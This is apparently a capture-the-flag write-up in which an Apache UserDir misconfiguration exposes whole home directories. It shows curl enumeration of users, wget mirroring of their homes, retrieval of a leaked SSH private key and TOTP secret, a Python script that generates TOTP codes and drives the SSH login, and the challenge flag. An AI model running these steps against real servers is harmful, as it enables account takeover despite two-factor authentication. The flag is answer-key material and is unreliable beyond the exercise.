#### Challenge:

Hi Senior Researcher,

the NREN-TCC research community uses a secure terminal server for running experiments and accessing computational resources. The terminal server has recently acquired a new feature, currently still in testing and not yet announced to its users: every scientist can now publish a personal homepage directly from their home directory.

It sounds convenient. Perhaps even dangerous. Take a closer look and see what can go wrong.

Stay curious!

The server sits on <code>home.nren.tcc</code>

---

#### Solution:

The "personal homepage from your home directory" feature is Apache **mod_userdir**, but
misconfigured so that `http://home.nren.tcc/~<user>/` is mapped to the user's **entire home
directory** (not a `public_html` sub-dir) with directory `Indexes` enabled. This leaks every
world-readable file in scientists' home directories, including dotfiles and secrets.

Confirm the server and that UserDir is active (random/system users give `403`/`404`):

```bash
curl -I http://home.nren.tcc/            # Apache/2.4.68 (Debian), static banner page
curl -s http://home.nren.tcc/~root/      # 404 (UserDir disabled root)
curl -s http://home.nren.tcc/~john/      # 200 -> full "Index of /~john" home-dir listing
```

Enumerate which users have a readable home (first-name wordlist, keep only non-403/404):

```bash
cat /home/*/.config/chromium/ZxcvbnData/3/{male,female}_names.txt \
  | tr 'A-Z' 'a-z' | grep -E '^[a-z][a-z0-9_-]*$' | sort -u > allnames.txt
cat allnames.txt | xargs -P30 -I{} sh -c \
  'c=$(curl -s -o /dev/null -w "%{http_code}" "http://home.nren.tcc/~{}/"); \
   [ "$c" != 403 ] && [ "$c" != 404 ] && echo "{} -> $c"'
# -> david, john, karen, peter, tom  (all 200)
```

Mirror every readable home. **karen** leaked a private SSH key and her 2FA setup:

```bash
for u in david john karen peter tom; do
  wget -q -r -np -nH -R 'index.html*' -e robots=off "http://home.nren.tcc/~$u/" -P mirror
done
curl -s http://home.nren.tcc/~karen/id_ed25519          # OpenSSH ed25519 PRIVATE key
curl -s http://home.nren.tcc/~karen/.bash_history        # reveals TOTP secret + key is in authorized_keys
# ...
# google-authenticator ...
# qrencode -o qr.png 'otpauth://totp/karen@nren-2fa?secret=7PCPRMSL2IMTH3KS&issuer=nren'
# ssh-keygen -t ed25519 -N '' -f ~/id_ed25519 -C 'karen@nren-deploy'
# cat ~/id_ed25519.pub >> ~/.ssh/authorized_keys
```

SSH logs in require **publickey + keyboard-interactive (TOTP)**. We have both: the leaked key
and the TOTP secret `7PCPRMSL2IMTH3KS`. Log in and read the flag (TOTP generated inline, fed to
the keyboard-interactive prompt via a pty):

```bash
curl -s http://home.nren.tcc/~karen/id_ed25519 -o karen_key && chmod 600 karen_key
python3 - <<'PY'
import base64,hashlib,hmac,struct,time,pty,os,select,sys
k=base64.b32decode('7PCPRMSL2IMTH3KS'+'===')
def totp():
    h=hmac.new(k,struct.pack('>Q',int(time.time())//30),hashlib.sha1).digest();o=h[-1]&0xf
    return f"{(struct.unpack('>I',h[o:o+4])[0]&0x7fffffff)%1000000:06d}"
pid,fd=pty.fork()
if pid==0:
    os.execvp('ssh',['ssh','-i','karen_key','-o','StrictHostKeyChecking=no',
      '-o','PreferredAuthentications=publickey,keyboard-interactive',
      'karen@home.nren.tcc','grep -raoE "FLAG\\{[^}]*\\}" / 2>/dev/null; echo DONE'])
buf=b'';sent=False
while True:
    r,_,_=select.select([fd],[],[],1)
    if fd in r:
        try:d=os.read(fd,4096)
        except OSError:break
        if not d:break
        buf+=d;sys.stdout.buffer.write(d);sys.stdout.flush()
        if b'erification code' in buf and not sent:
            os.write(fd,(totp()+'\n').encode());sent=True
    if b'DONE' in buf:break
PY
# [ NREN 2FA gateway ] authentication successful
# FLAG{qPb2-qVV8-WwkZ-Kq7G}
```

**Root cause:** Apache `UserDir` exposing full home directories with `Indexes` on — a world-readable
private SSH key plus a shell-history-leaked TOTP secret defeats both SSH auth factors.

---

<details><summary>FLAG:</summary>

```
FLAG{qPb2-qVV8-WwkZ-Kq7G}
```

</details>
<br/>
